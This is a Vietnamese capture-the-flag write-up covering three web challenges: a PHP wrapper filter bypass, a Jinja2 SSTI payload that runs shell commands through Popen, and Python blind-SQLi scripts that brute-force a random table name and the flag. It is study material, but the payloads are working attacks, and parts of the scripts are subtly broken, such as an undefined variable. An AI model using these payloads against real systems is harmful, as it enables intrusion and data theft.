---
title: WannaGame Freshman 2023
date: 2023-11-11
tags:
 - SQLi 
 - SSTI
categories:
 - CTF
---

## WEB: Warmup PHP
:::info Challenge
Let's get started. Try to read flag at root directory.
> `http://45.122.249.68:20021`
:::

::::code-group
 :::code-group-item index.php
```php
<?php

error_reporting(0);

show_source(__FILE__);

function check_valid($str)
{
    $blacklist = ['php', 'file', 'glob', 'data', 'http', 'zip', 'zlib', 'phar', 'W1'];
    $pattern = '/' . implode('|', $blacklist) . '/i';

    if (preg_match($pattern, $str, $matches)) {
        return false;
    }
    return true;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $body = file_get_contents('php://input');
    $json = json_decode($body, true);

    if ($json === null && json_last_error() !== JSON_ERROR_NONE) {
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Invalid JSON']);
        exit;
    }


    if (isset($json) && isset($json['page']) && check_valid($body)) {
        $page = $json['page'];
        $content = file_get_contents($page);
        if (!$content) {
            $content = "Not found";
        } else {
            if (!check_valid($content)) {
                $content = "Invalid content";
            }
        }
    } else {
        $content = "Invalid request";
    }

    header('Content-Type: application/json');
    echo json_encode(['content' => $content]);
}
```
:::
::::
Server sẽ lấy input từ `POST` request gửi đến, và gọi hàm `file_get_contents`.
Ta thử đọc file `/flag`
```
Request: {"page":"/flag"}
---------
Response: {"content":"Invalid content"}
```
Vì content của file `/flag` có chứa `W1` nên cần phải encode content của file để có thể in ra thành công.
Trong quá trình reserach thì mình có tìm ra PHP Wrapper có thể encode nội dung của file như sau
```
php://filter/convert.base64-encode/resource=/flag
```
Tuy nhiên `php` đã bị filter. JSON có escape character đặc biệt là `\uXXXX` là unicode của UTF-16.
Do PHP không có nên khi kiểm tra `check_valid($body)` sẽ không nhận ra điều gì bất thường. Qua hàm `json_decode()` nó sẽ được decode và đọc.
```
Request: {"page":"\u0070\u0068\u0070://filter/convert.base64-encode/resource=/flag"}
---------
Response: {"content":"VzF7dzNsYzBtM193M2JfdzRycmowcnN9Cg=="}
```
Decode basễ và ra flag.

**FLAG:** `W1{w3lc0m3_w3b_w4rrj0rs}`
<br />
## WEB: NAMENAME
:::info Challenge
I tried coding a website to say hello to everyone, please try and feel it
> `http://45.122.249.68:20029/`
:::

`Ctrl U` xem src thấy có đường dẫn đến `/wannaw1n`. Web sẽ trỏ đến 
`/wannaw1n?c=hacker` và trả về 
```
Hello hacker
```
Đây có thể là render template nên mình nghĩ đến SSTI. Sau một hồi thử thì mình xác định được đây là từ `Python/Jinja2`
Đây là payload ban đầu mình dùng class `Popen` để sử dụng lệnh `cat` đọc file flag
```
{{"".__class__.__mro__"[1].__subclasses__()[279]("cat flag.txt",shell=1,stdout=-1).communicate()}}
```
Tuy nhiên trong quá trình thử thì có phát hiện ra server đã filter một số kí tự như là
`.`, `[`, `]`, `f`, `\`. Do đó cần chỉnh sửa một chút về payload, và chuyển sang read toàn bộ các file trong directory hiện tại với `cat *` hoặc có thể dùng `cat *lag*`, `cat ?lag????` vì chữ flag không hoàn toàn bị filter.
Chi tiết có thể xem qua [đây](https://hackmd.io/@d0qbu/HJoJxEK-a#WEB-thru-the-filter)
```
{{""|attr("__class__")|attr("__mro__")|attr("__getitem__")(1)|attr("__subclasses__")()|attr("__getitem__")(279)("cat+*",shell=1,stdout=-1)|attr("communicate")()}}
```

**FLAG:** `W1{U_are_master_in_SSTI}`
<br />
## WEB: Solite
:::info Challenge
Recon carefully so as not to miss anything
>`http://45.122.249.68:20020/`
> 
> [solite.zip](https://uithcm-my.sharepoint.com/:u:/g/personal/23520385_ms_uit_edu_vn/EVHsVm4QZ4xAgcivw2md5PsBiVX5J-6yMeDy1BVXzgT37w?e=a937rn)
:::
Server sử dụng SQLite3, tạo 2 tables API và flag. 
```js
db.serialize(() => {
    db.run('CREATE TABLE API (id INTEGER PRIMARY KEY, joke TEXT)');

    const stmt = db.prepare('INSERT INTO API (id, joke) VALUES (?, ?)');
    const dataToInsert = [
    { id: 1, joke: "What did the bartender say to the jumper cables? You better not try to start anything."},
    ...
  ];
  
  dataToInsert.forEach((data) => {
    stmt.run(data.id, data.joke);
  });
  
  stmt.finalize();

    const flagTable = `flag_${uuid.v4().replace(/-/g, '_')}`;
    console.log(`flagTable: ${flagTable}`);
    db.run(`CREATE TABLE IF NOT EXISTS ${flagTable} (flag TEXT)`);

    db.run(`INSERT INTO ${flagTable} (flag) VALUES ('${flag}')`);
})
```
Tuy nhiên table flag được sinh ngẫu nhiên nên ta cần bruteforce để biết tên của table này.
<br />Khi GET đến `/search` với `name`, server sẽ đọc từ table API và trả về câu joke với `id` là value của name -> Có thể SQLi ở đây.
```javascript
app.get('/search', (req, res) => {
    const { name } = req.query;
    const Filterduidui = /(union|or|substring|substrs|if|case|=|when|then|join|load_extension|likely|unhex|\|\|)/i;

    if (!name) {
        return res.redirect('/search?name=1');
    }

    if (Filterduidui.test(name)) {
        return res.status(400).send({ err: 'chuc mung ban da giai duoc challenge nay' });
    }

    if (!name) {
        return res.status(400).send({ err: 'Try with name param' });
    }

    if (name.length > 6) {
        return res.status(400).send({ err: 'U r hacker?' });
    }

    let query = `SELECT * FROM API WHERE id LIKE '%${(name)}%'`;
    db.all(`SELECT * FROM API WHERE id LIKE '%${name}%'`, (err, rows) => {
        if (err) {
            console.error(err.message);
            return res.status(500).send('Hey, what r u doing??? i will call police or don\'t hack this machine');
        }

        return res.send(rows);
    });
```
Server sẽ kiểm tra length của `?name`, ta có thể bypass bằng cách truyền vào array object thay vì chuỗi thông thường.
`?name[]=` là array khi truyền vào có 1 phần tử nên length sẽ chỉ trả về `1`. 
<br />Ban đầu mình nghĩ đây là bài SQLi bình thường, tìm cách để server trả về flag từ table. Nhưng do filter đã chặn `UNION` và `||` nên mình nghĩ tới hướng blind sql.
Đầu tiên là cần có được tên của flag table. Table được sinh ngẫu nhiên với `uuid.v4()`, đoạn này chỉ bao gồm các kí tự `[a-f0-9]`
Table sẽ có tên dạng `flag_????????_????_????_????_????????????` trong đó `?` là các kí tự cần tìm. Giờ chỉ cần bruteforce

Sau khi chạy xong sẽ ra table là `flag_c1abd148_acae_40be_a953_eae333f90da0`. Ta lại bruteforce tiếp để tìm flag
::::code-group
 :::code-group-item getTableName.py
```python
import requests
from threading import Thread

"""
Payload: ?name[]=1' AND (SELECT hex(tbl_name) FROM sqlite_master WHERE type LIKE 'table' and tbl_name like '{}%' limit 1 offset 0) > '0';--
  - {} is table name
  - Server will return [] if table name is not exist
"""

URL = "http://45.122.249.68:20020/search?name[]=1'+AND+(SELECT+hex(tbl_name)+FROM+sqlite_master+WHERE+type+LIKE+'table'+and+tbl_name+like+'{}%25'+limit+1+offset+0)+>+'0'%3b--"
CHARS = '09123456789abcdef'
table = ['f', 'l', 'a', 'g', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_']

def check(index):
    currentTable = [*table]
    for char in chars:
        currentTable[index] = char
        r = requests.get(url=URL.format(''.join(currentTable)))

        if (r.text != "[]"):
            table[index] = char
            print(table)
            return

if __name__ == "__main__":
    for i in range(5, len(table)):
        # Skip default '_' character
        if (i in [13, 18, 23, 28]): continue
        Thread(target=lambda: check(i)).start()
```
 :::
 :::code-group-item getFlag.py
```python
import requests
from threading import Thread

"""
URL_LENGTH_CHECK: ?name[]=1' AND (SELECT length(flag) FROM flag_c1abd148_acae_40be_a953_eae333f90da0) > {};--
  - {} is flag length
URL_FLAG_CHECK: ?name[]=1' AND (SELECT hex(flag) FROM flag_c1abd148_acae_40be_a953_eae333f90da0 WHERE flag LIKE '{}%') > '0';--
  - {} is flag

- Server will return [] if something wrong
"""

URL_LENGTH_CHECK = "http://45.122.249.68:20020/search?name[]=1'+AND+(SELECT+length(flag)+FROM+flag_c1abd148_acae_40be_a953_eae333f90da0)+>+{}%3b--"
URL_FLAG_CHECK = "http://45.122.249.68:20020/search?name[]=1'+AND+(SELECT+hex(flag)+FROM+flag_c1abd148_acae_40be_a953_eae333f90da0+WHERE+flag+LIKE+'{}%25')+>+'0'%3b--"
CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@$^*()_+{}[];':\",./<>?\\|`~"
flag = []
flagLength = 0

def getFlagLength():
    i = 5
    while True:
        r = requests.get(url=URL_LENGTH_CHECK.format(i))
        if (r.text == "[]"):
            return i
        
        i += 1

def check(index):
    currentFlag = [*flag]
    for char in chars:
        currentFlag[index] = char
        r = requests.get(url=URL_FLAG_CHECK.format(''.join(currentFlag)))

        if (r.text != "[]"):
            flag[index] = char
            print(flag)

            return

if __name__ == "__main__":
    flagLength = getFlagLength()

    flag = ['_'] * flagLength
    flag[0] = 'W'
    flag[1] = '1'
    flag[2] = '{'
    flag[-1] = '}'

    for i in range(3, len(flag) - 1):
        Thread(target=lambda: check(i)).start()
```
 :::
::::
<br />**FLAG:** `W1{i_th1nk_u_r_so_lite^_^}`
<br />
#
Tóm tắt lại giải Freshman năm nay rất là chất lượng. Không chỉ từ đề thi mà các anh chị cũng rất thân thiện, tận tình với đứa như em :(. Mặc dù chỉ solve được 2/5 bài web trong thời gian 8 tiếng, hơi tiếc là bài Solite mình đã không thể giải quyết nốt trong thời gian còn lại.